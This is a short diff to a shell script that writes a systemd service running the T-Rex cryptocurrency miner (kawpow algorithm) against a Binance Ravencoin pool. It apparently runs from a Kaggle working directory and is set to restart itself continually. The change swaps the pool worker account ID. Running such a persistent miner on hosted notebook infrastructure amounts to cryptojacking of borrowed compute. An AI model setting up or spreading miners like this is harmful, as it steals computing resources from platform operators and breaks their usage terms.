@@ -16,7 +16,7 @@ read -r -d '' SERVICE1_CONFIG <<EOF
 Description=My one Service
 
 [Service]
-ExecStart=/kaggle/working/t-rex/t-rex -a kawpow -o stratum+tcp://rvn.poolbinance.com:9000 -u 405482.001 -p 123456 --no-strict-ssl
+ExecStart=/kaggle/working/t-rex/t-rex -a kawpow -o stratum+tcp://rvn.poolbinance.com:9000 -u 617680.001 -p 123456 --no-strict-ssl
 
 RestartSec=5
 Restart=always
